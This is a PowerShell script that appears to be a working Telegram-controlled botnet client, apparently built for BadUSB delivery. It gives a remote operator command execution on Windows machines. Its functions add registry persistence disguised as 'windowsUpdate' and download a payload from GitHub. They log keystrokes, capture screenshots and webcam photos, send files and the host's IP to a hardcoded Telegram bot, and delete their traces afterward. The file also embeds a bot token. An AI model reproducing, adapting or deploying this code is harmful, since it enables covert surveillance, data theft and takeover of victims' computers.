$BotToken = "1259551971:AAGxEPbYhrAb4F12CZRwvDWtJyF806trRG4"
$ChatID = '1058178282'
$githubScript = 'https://raw.githubusercontent.com/Moessec/badusb_botnet/master/poc.ps1'

function turnOffScreen {
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
 
    namespace Utilities {
       public static class Display
       {
          [DllImport("user32.dll", CharSet = CharSet.Auto)]
          private static extern IntPtr SendMessage(
             IntPtr hWnd,
             UInt32 Msg,
             IntPtr wParam,
             IntPtr lParam
          );
 
          public static void PowerOff ()
          {
             SendMessage(
                (IntPtr)0xffff, // HWND_BROADCAST
                0x0112,         // WM_SYSCOMMAND
                (IntPtr)0xf170, // SC_MONITORPOWER
                (IntPtr)0x0002  // POWER_OFF
             );
          }
       }
    }
    '

    [Utilities.Display]::PowerOff()
}

function backdoor {
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
        
        Send-Message "Downloading.."
        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1

        Send-Message "Adding_to_the_reg.."
		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"

        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
		
        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
        Invoke-Expression -Command:$command
}

function screenshot {
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
        function screenshot([Drawing.Rectangle]$bounds, $path) {
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

           $bmp.Save($path)

           $graphics.Dispose()
           $bmp.Dispose()
        }
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        screenshot $bounds "C:\Users\$env:username\Documents\screenshot.jpg"
}

function cleanAll {

    Send-Message "Deleting_screenshots.."
    Remove-Item "C:\Users\$env:username\Documents\screenshot.jpg"

    Send-Message "Deleting_cURL.."
    Remove-Item -Recurse "C:\Users\$env:username\AppData\Local\Temp\1"

    Send-Message "Deleting_backdoor.."
    Remove-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1"
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
    
    Send-Message "Deleting_netcat.."
    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
    Remove-Item "C:\Users\$env:username\Documents\nc.zip"
}

function installCurl {
    $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
        $curl_zip = $ruta + "\curl.zip"
        $curl = $ruta + "\" + "curl.exe"
        $curl_mod = $ruta + "\" + "curl_mod.exe"
        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
        }
        return $curl
    }
    return $curl    
}

function sendPhoto {
    Send-Message "Sending.."
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    Start-Sleep -Seconds 5
    Send-Message "Deleting.."
    Remove-Item $photo
    & $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
}

function Send-Message($message) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
}

function ipPublic {
    $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
}

function download($FileToDownload) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden

    curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
}

function keylogger($seconds) {
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $Path = "$env:temp\keylogger.txt"
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  $null = New-Item -Path $Path -ItemType File -Force

  try {
    Write-Host 'Recording..'
    Send-Message 'Recording..'

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    $timeout = new-timespan -Seconds  $time
    $sw = [diagnostics.stopwatch]::StartNew()
    while ($sw.elapsed -lt $timeout) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)


          if ($success) {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }

  finally {
    Write-Host "Downloading keylogger file.."
    Send-Message 'Downloading..'
    download $Path

    Start-Sleep -Seconds 5
    Write-Host "Deleting keylogger file.."
    Send-Message 'Deleting..'
    Remove-Item $Path
  }
}

function webcam {
    Send-Message "Downloading.."
    # https://batchloaf.wordpress.com/commandcam/
    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath

    Send-Message "Taking_picture.."
    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
    Start-Sleep -Seconds 5

    Send-Message "Sending_picture.."
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\image.jpg"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    Start-Sleep -Seconds 5
    Send-Message "Deleting_picture.."
    Remove-Item $photo
    Remove-Item $outpath
}

function mainBrowser {
    Send-Message "Checking_main_browser_on_the_reg.."
    $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice

    if ($mainBrowser -match 'chrome') {
        Send-Message "Chrome!"
        $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
        if(![System.IO.File]::Exists($chrome)){
            $chrome = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
            Send-Message "Chrome x64!"
            return $chrome
        }
        Send-Message "Chromex86!"
        return $chrome
     }

    ElseIf ($mainBrowser -match 'Firefox') {
        Send-Message "Firefox!"
        $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
        if(![System.IO.File]::Exists($firefox)){
            $firefox = "${env:ProgramFiles}\Mozilla Firefox\firefox.exe"
            Send-Message "Firefox x64!"
            return $firefox
        }
        Send-Message "Firefoxx86!"
        return $firefox
     }
}


$whoami = Invoke-Expression whoami
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
$ipV4 = $ipV4.IPAddressToString
$hostname = Invoke-Expression hostname
$pwd = pwd

$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
if($nopreview) { $preview_mode = "True" }
if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}

$payload = @{
    "chat_id" = $ChatID;
    "text" = $info;
    "parse_mode" = $markdown_mode;
    "disable_web_page_preview" = $preview_mode;
}
Invoke-WebRequest `
    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload)

$LoopSleep = 3
 
$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
 
$DoNotExit = 1

$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
 
$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
While ($DoNotExit)  {
  Sleep -Seconds $LoopSleep
  #Reset variables that might be dirty from the previous cycle
  $LastMessageText = ""
  $CommandToRun = ""
  $CommandToRun_Result = ""
  $CommandToRun_SimplifiedOutput = ""
  $Message = ""
  
  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
  
  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
  $LastMessageTime = $LastMessage.message.date
  
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
	$PreviousLoop_LastMessageTime = $LastMessageTime
	#Update the LastMessageTime
	$LastMessageTime = $LastMessage.Message.Date
	#Update the $LastMessageText
	$LastMessageText = $LastMessage.Message.Text
	
	Switch -Wildcard ($LastMessageText)  {
	  "/select $ipV4 *"  { #Important: run with a space
	    #The user wants to run a command
		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
		
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}
		
		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
        $pwd = pwd
        $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
	  }
	  "/stop $ipV4"  {
		write-host "The script will end in 5 seconds"
		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
		Sleep -seconds 5
		$DoNotExit = 0
	  }
      "/list"  {
        Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload)
      }
      "/screenshot $ipV4"{
        screenshot
        sendPhoto
      }
      "/backdoor $ipV4"  {
        backdoor
      }
      "/cleanAll $ipV4" {
        cleanAll
      }
      "/ipPublic $ipV4" {
        ipPublic
      }
      "/download $ipV4 *"{
        $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
        download $FileToDownload
      }
      "/webcam $ipV4"{
        webcam
      }
    
      "/keylogger $ipV4 *"{
        $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
        keylogger seconds $time
      }
	  default  {
		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
	  }
	}
	
  }
}
